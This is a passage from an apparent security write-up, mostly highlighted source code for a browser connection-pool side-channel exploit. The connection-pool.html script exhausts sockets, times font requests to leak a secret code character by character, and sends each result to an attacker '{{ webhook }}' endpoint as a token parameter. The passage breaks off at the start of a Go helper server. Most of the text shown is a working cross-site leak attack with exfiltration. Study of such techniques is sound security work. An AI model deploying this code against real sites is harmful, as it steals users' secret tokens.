</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;{{ webhook }}?STARTING_LEAK&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nx>w2</span> <span class=o>=</span> <span class=nx>popup</span><span class=p>(</span><span class=s2>&#34;/connection-pool&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>history</span><span class=p>.</span><span class=nx>go</span><span class=p>(</span><span class=o>-</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;DOMContentLoaded&#34;</span><span class=p>,</span> <span class=nx>main</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=connection-poolhtml><a class=full-clickable-heading href=#connection-poolhtml>connection-pool.html</a></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>textarea</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;log&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width: 100%; height: 300px;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>textarea</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nx>LOG</span> <span class=o>=</span> <span class=s1>&#39;Starting&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nx>SOCKETLIMIT</span> <span class=o>=</span> <span class=mi>255</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>MYSERVER</span> <span class=o>=</span> <span class=sb>`sleep.yourserver.test`</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>done</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>leaked_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>logtextarea</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;log&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>log</span> <span class=o>=</span> <span class=p>(</span><span class=nx>l</span><span class=p>,</span> <span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;INFO&#39;</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>timestamp</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>toLocaleTimeString</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>prefix</span> <span class=o>=</span> <span class=s1>&#39;[!] &#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>type</span> <span class=o>===</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>prefix</span> <span class=o>=</span> <span class=s1>&#39;[+] &#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>type</span> <span class=o>===</span> <span class=s1>&#39;FAILURE&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>prefix</span> <span class=o>=</span> <span class=s1>&#39;[x] &#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>value</span> <span class=o>+=</span> <span class=sb>`[</span><span class=si>${</span><span class=nx>timestamp</span><span class=si>}</span><span class=sb>] </span><span class=si>${</span><span class=nx>prefix</span><span class=si>}${</span><span class=nx>l</span><span class=si>}</span><span class=sb>\n`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>scrollTop</span> <span class=o>=</span> <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>scrollHeight</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fetch_sleep_long</span> <span class=o>=</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>controller</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>AbortController</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>signal</span> <span class=o>=</span> <span class=nx>controller</span><span class=p>.</span><span class=nx>signal</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://sleep</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/120?q=</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>signal</span><span class=o>:</span> <span class=nx>signal</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>controller</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fetch_step_6</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>start</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://aaaaa</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/0?q=</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>block_socket</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>exhaust_sockets</span> <span class=o>=</span> <span class=kr>async</span><span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>SOCKETLIMIT</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>block_socket</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Used </span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb> connections`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>fetch_step_3</span><span class=p>(</span><span class=nx>i</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://zzzz</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/0?q=</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nx>done</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>leak_char</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nx>done</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>hashmap</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mi>1</span><span class=o>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>2</span><span class=o>:</span> <span class=s2>&#34;B&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>3</span><span class=o>:</span> <span class=s2>&#34;C&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>4</span><span class=o>:</span> <span class=s2>&#34;D&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>5</span><span class=o>:</span> <span class=s2>&#34;E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>6</span><span class=o>:</span> <span class=s2>&#34;F&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>7</span><span class=o>:</span> <span class=s2>&#34;0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>8</span><span class=o>:</span> <span class=s2>&#34;9&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>9</span><span class=o>:</span> <span class=s2>&#34;8&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>10</span><span class=o>:</span> <span class=s2>&#34;7&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>11</span><span class=o>:</span> <span class=s2>&#34;6&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>12</span><span class=o>:</span> <span class=s2>&#34;5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>13</span><span class=o>:</span> <span class=s2>&#34;4&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>14</span><span class=o>:</span> <span class=s2>&#34;3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>15</span><span class=o>:</span> <span class=s2>&#34;2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>16</span><span class=o>:</span> <span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>res_blocker_controller</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Starting step 3...`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>5</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>fetch_step_3</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Waiting for font requests...`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Wait until the first font is requested and then free the socket
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>4000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>res_blocker_controller</span><span class=p>.</span><span class=nx>abort</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Starting step 6...`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch_step_6</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>done</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>[</span><span class=nx>hashmap</span><span class=p>[</span><span class=nx>i</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>],</span> <span class=nx>hashmap</span><span class=p>[</span><span class=nx>i</span> <span class=o>-</span> <span class=mi>2</span><span class=p>]</span> <span class=o>||</span> <span class=s2>&#34;A&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>exhaust_sockets</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.1 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.2 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>11000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.3 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>21000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.4 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>31000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.5 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>41000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>result1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>leak_char</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`char n.6 guess: </span><span class=si>${</span><span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;SUCCESS&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>leaked_code</span> <span class=o>+=</span> <span class=nx>result1</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked code so far </span><span class=si>${</span><span class=nx>leaked_code</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s1>&#39;INFO&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`{{ webhook }}?token=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>leaked_code</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>51000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>main</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><h4 id=go-server><a class=full-clickable-heading href=#go-server>Go Server</a></h4><p>This is the server code I usually use to do Connection Pool-related exploits</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;strconv&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;time&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/valyala/fasthttp&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>workerSemaphore</span> <span class=p>=</span> <span class=nb>make</span><span class=p>(</span><span class=kd>chan</span> <span class=kd>struct</span><span class=p>{},</span> <span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
